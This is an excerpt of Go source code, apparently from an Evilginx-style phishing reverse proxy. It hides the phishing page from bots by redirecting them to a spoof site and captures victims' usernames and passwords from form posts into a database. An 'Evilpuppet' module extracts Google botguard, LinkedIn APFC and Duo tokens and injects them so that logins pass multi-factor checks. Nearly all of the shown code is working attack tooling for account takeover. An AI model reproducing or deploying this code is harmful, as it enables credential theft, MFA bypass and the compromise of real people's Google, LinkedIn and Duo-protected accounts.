...
func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	...
	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			...
			// BotGuard check
			botGuard := GetBotGuard()
			if botGuard.IsEnabled() {
				isBot, reasons := botGuard.CheckRequest(req, "") // JA4 fingerprint would need TLS hook
				if isBot {
					spoofURL := botGuard.GetSpoofURL()
					if spoofURL != "" {
						log.Warning("[BotGuard] Bot blocked from %s - redirecting to spoof: %s (reasons: %s)", from_ip, spoofURL, reasons)
						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
						resp.Header.Add("Location", spoofURL)
						return req, resp
					} else {
						log.Warning("[BotGuard] Bot blocked from %s (reasons: %s)", from_ip, reasons)
						return p.blockRequest(req)
					}
				}
			}
			...
			if phished {
						...
						if !p.cfg.IsSiteHidden(pl_name) {
							if l != nil {
								...
								if err == nil {
									...
									session.LandingURL = landing_url
				...
				// fix sec-fetch-site - important for Google to accept requests
				...
				// fix sec-fetch-mode
				sec_fetch_mode := req.Header.Get("Sec-Fetch-Mode")
				if sec_fetch_mode == "cors" {
				...
				// Check for Evilpuppet triggers
				if pl != nil && ps.SessionId != "" {
					p.CheckEvilpuppetTrigger(pl, req, ps.SessionId)
				}
						...
						if json_re.MatchString(contentType) {
							...
							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
								...
								for k, v := range req.PostForm {
									// Debug: log all form fields for credential detection
									if k == "f.req" || k == "identifier" {
										log.Debug("[CRED-DEBUG] Form key='%s' value_len=%d value_preview='%.200s'", k, len(v[0]), v[0])
									}
									...
									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
										log.Debug("[CRED-DEBUG] Username key matched: %s", k)
										um := pl.username.search.FindStringSubmatch(v[0])
										log.Debug("[CRED-DEBUG] Username search result: %v", um)
										if um != nil && len(um) > 1 {
											p.setSessionUsername(ps.SessionId, um[1])
											log.Success("[%d] Username: [%s]", ps.Index, um[1])
											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
									...
									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
										log.Debug("[CRED-DEBUG] Password key matched: %s", k)
										pm := pl.password.search.FindStringSubmatch(v[0])
										log.Debug("[CRED-DEBUG] Password search result: %v", pm)
										if pm != nil && len(pm) > 1 {
											p.setSessionPassword(ps.SessionId, pm[1])
											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
			...
			if is_cookie_auth && is_body_auth && is_http_auth {
				...
				if s, ok := p.sessions[ps.SessionId]; ok {
					if !s.IsDone {
						...
						// Telegram notification is handled by database watcher
...
// Evilpuppet integration methods

// TriggerEvilpuppet triggers the Evilpuppet module for token extraction
func (p *HttpProxy) TriggerEvilpuppet(sessionID, phishletName string, triggerType string, params map[string]string) {
	if p.evilpuppet == nil || !p.evilpuppet.IsEnabled() {
		return
	}

	s, ok := p.sessions[sessionID]
	if !ok {
		log.Warning("[Evilpuppet] Session not found: %s", sessionID)
		return
	}

	// Create session context for Evilpuppet
	...
	// Trigger based on phishlet name
	go func() {
		...
		switch triggerType {
		case "botguard":
			// Google botguard token extraction
			email := sessionCtx.Email
			if email == "" {
				email = sessionCtx.Username
			}
			result, err = p.evilpuppet.ExtractGoogleBotguardToken(ctx, email)
			
		case "apfc":
			// LinkedIn APFC token extraction
			result, err = p.evilpuppet.ExtractLinkedInAPFC(ctx, sessionCtx.Username, sessionCtx.Password)
			
		case "duo":
			// Duo Security sig_response extraction
			duoHost := params["duo_host"]
			sigRequest := params["sig_request"]
			if duoHost != "" && sigRequest != "" {
				result, err = p.evilpuppet.ExtractDuoFrameID(ctx, duoHost, sigRequest)
			}
			
		default:
			log.Debug("[Evilpuppet] Unknown trigger type: %s", triggerType)
			return
		}

		if err != nil {
			log.Warning("[Evilpuppet] Token extraction failed: %v", err)
			return
		}

		if result != nil && result.Success {
			log.Success("[Evilpuppet] Captured %s token for session %s", result.TokenName, sessionID)
			// Cache the token for later injection
			p.evilpuppet.CacheToken(sessionID, result.TokenName, result.Token)
			// Store in session body tokens
			s.BodyTokens[result.TokenName] = result.Token
		}
	}()
}

// InjectEvilpuppetToken injects a cached token into the request body
func (p *HttpProxy) InjectEvilpuppetToken(sessionID string, body []byte, tokenName, pattern string) []byte {
	if p.evilpuppet == nil || !p.evilpuppet.IsEnabled() {
		return body
	}

	token, ok := p.evilpuppet.GetCachedToken(sessionID, tokenName)
	if !ok {
		return body
	}

	// Replace the pattern with the actual token
	return p.evilpuppet.ReplaceTokenInBody(body, pattern, token)
}

// CheckEvilpuppetTrigger checks if a request should trigger Evilpuppet
func (p *HttpProxy) CheckEvilpuppetTrigger(pl *Phishlet, req *http.Request, sessionID string) {
	if p.evilpuppet == nil || !p.evilpuppet.IsEnabled() || pl == nil {
		return
	}
	...
	// Check for Google botguard trigger
	if strings.Contains(host, "accounts.google.com") || strings.Contains(host, "google.com") {
		if strings.Contains(path, "/signin") || strings.Contains(path, "/ServiceLogin") {
			email := req.URL.Query().Get("Email")
			if email == "" {
				email = req.URL.Query().Get("email")
			}
			if email != "" {
				...
				p.TriggerEvilpuppet(sessionID, pl.Name, "botguard", params)
			}
		}
	}

	// Check for LinkedIn APFC trigger
	if strings.Contains(host, "linkedin.com") {
		if strings.Contains(path, "/checkpoint") || strings.Contains(path, "/login-submit") {
			p.TriggerEvilpuppet(sessionID, pl.Name, "apfc", nil)
		}
	}

	// Check for Duo Security trigger
	if strings.Contains(host, "duosecurity.com") || strings.Contains(host, "duo.com") {
		sigRequest := req.URL.Query().Get("tx")
		if sigRequest != "" {
			params := map[string]string{
				"duo_host":    host,
				"sig_request": sigRequest,
			}
			p.TriggerEvilpuppet(sessionID, pl.Name, "duo", params)
		}
	}
}

// InitializeEvilpuppet initializes the Evilpuppet module
func (p *HttpProxy) InitializeEvilpuppet() error {
	if p.evilpuppet == nil {
		p.evilpuppet = GetEvilpuppet()
	}
	return p.evilpuppet.Initialize()
}

// ShutdownEvilpuppet shuts down the Evilpuppet module
func (p *HttpProxy) ShutdownEvilpuppet() {
	if p.evilpuppet != nil {
		p.evilpuppet.Shutdown()
	}
}

// SetEvilpuppetEnabled enables or disables Evilpuppet
func (p *HttpProxy) SetEvilpuppetEnabled(enabled bool) {
	if p.evilpuppet != nil {
		p.evilpuppet.SetEnabled(enabled)
		if enabled {
			log.Info("[Evilpuppet] Module enabled")
		} else {
			log.Info("[Evilpuppet] Module disabled")
		}
	}
}

// GetEvilpuppet returns the Evilpuppet instance
func (p *HttpProxy) GetEvilpuppet() *Evilpuppet {
	return p.evilpuppet
}
